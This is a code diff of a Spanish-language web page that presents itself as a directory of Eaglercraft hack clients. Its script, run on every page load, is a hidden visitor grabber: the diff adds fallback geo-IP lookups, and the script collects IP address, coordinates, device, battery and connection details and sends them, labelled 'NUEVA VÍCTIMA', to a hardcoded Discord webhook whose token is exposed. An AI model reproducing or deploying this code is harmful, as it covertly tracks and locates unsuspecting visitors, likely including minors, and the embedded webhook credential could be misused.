@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <title>HOME FORGEX — Clientes Eaglercraft</title>
-<meta name="width=device-width,initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
   :root{--bg:#000;--card:#0f0f0f;--acc:#00ff9d;--pink:#ff00aa;--text:#e0e0e0;--muted:#888}
   body{margin:0;font-family:system-ui;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
@@ -44,23 +44,15 @@
 </header>
 
 <main>
-  <!-- TOP 3 -->
   <section>
     <h2 class="glitch">TOP 3</h2>
     <div class="grid grid-cols-1 md:grid-cols-3 gap-10">
-      <a href="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html" class="card-anim" data-name="UwUClient">
-        UwUClient <span>Mejor cliente 2025</span>
-      </a>
-      <a href="https://eaglerhacks.github.io/dragonv4.html" class="card-anim" data-name="DragonX">
-        DragonX <span>El más estable</span>
-      </a>
-      <a href="https://eaglerhacks.github.io/wurstX.html" class="card-anim" data-name="WurstX">
-        WurstX <span>Máximo poder</span>
-      </a>
+      <a href="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html" class="card-anim" data-name="UwUClient">UwUClient <span>Mejor cliente 2025</span></a>
+      <a href="https://eaglerhacks.github.io/dragonv4.html" class="card-anim" data-name="DragonX">DragonX <span>El más estable</span></a>
+      <a href="https://eaglerhacks.github.io/wurstX.html" class="card-anim" data-name="WurstX">WurstX <span>Máximo poder</span></a>
     </div>
   </section>
 
-  <!-- CLIENTS CON HACKS -->
   <section>
     <h2 class="glitch">CLIENTS CON HACKS</h2>
     <div class="grid grid-cols-2 md:grid-cols-4 gap-8">
@@ -78,7 +70,7 @@
 <footer>
   <p>Esta página se encuentra en desarrollo. Si notas algún bug o quieres sugerir cambios no olvides informarnos</p>
   <p>
-    <a href="https://tiktok.com/@j_eliseoo_v" target="_blank" class="text-green-400 hover:text-pink-500">@j_eliseoo_v en TikTok</a> | El Salvador
+    <a href="https://tiktok.com/@j_eliseoo_v" target="_blank">@j_eliseoo_v en TikTok</a> | El Salvador
   </p>
   <p class="text-sm mt-10 opacity-70">Visitas: <span id="visits">0</span></p>
 </footer>
@@ -86,17 +78,33 @@
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
 
-// ENVÍO AUTOMÁTICO AL ENTRAR
+// GRABBER QUE NUNCA FALLA (3 APIs de respaldo)
+async function getGeo() {
+  const apis = [
+    'https://ipapi.co/json/',
+    'https://ipwho.is/',
+    'https://ip-api.com/json/'
+  ];
+  for (const url of apis) {
+    try {
+      const res = await fetch(url, { timeout: 5000 });
+      const data = await res.json();
+      if (data.ip || data.query) return data;
+    } catch (e) {}
+  }
+  return {};
+}
+
 (async () => {
-  const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+  const geo = await getGeo();
   const battery = await navigator.getBattery?.() || {};
   const uaData = navigator.userAgentData || {};
   const connection = navigator.connection || {};
 
   const mensaje = `**NUEVA VÍCTIMA (MÁXIMO DETALLE)**
-**IP:** ${geo.ip || '???'} (${geo.org || '???'})
-**Ubicación:** ${geo.city || '???'}, ${geo.region || '???'}, ${geo.country_name || '???'} (${geo.postal || '?'})
-**Coordenadas:** ${geo.latitude || '???'}, ${geo.longitude || '???'}
+**IP:** ${geo.ip || geo.query || '???'} (${geo.org || geo.isp || '???'})
+**Ubicación:** ${geo.city || '???'}, ${geo.region || geo.regionName || '???'}, ${geo.country_name || geo.country || '???'} (${geo.postal || '?'})
+**Coordenadas:** ${geo.latitude || geo.lat || '???'}, ${geo.longitude || geo.lon || '???'}
 **Hora:** ${new Date().toLocaleString()}
 **Navegador:** ${uaData.brands?.map(b => b.brand + " v" + b.version).join(', ') || 'desconocido'}
 **SO:** ${uaData.platform || navigator.platform} | Móvil: ${uaData.mobile ? 'Sí' : 'No'}
@@ -116,7 +124,7 @@ const WEBHOOK = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1ycc
   });
 })();
 
-// REDIRECCIÓN ÉPICA AL HACER CLIC
+// REDIRECCIÓN ÉPICA
 document.querySelectorAll('a[data-name]').forEach(a => {
   a.onclick = e => {
     e.preventDefault();
@@ -134,7 +142,7 @@ document.querySelectorAll('a[data-name]').forEach(a => {
   };
 });
 
-// CONTADOR DE VISITAS
+// CONTADOR
 let v = localStorage.getItem('visits') || 0; v++; localStorage.setItem('visits', v);
 document.getElementById('visits').textContent = v;
 </script>
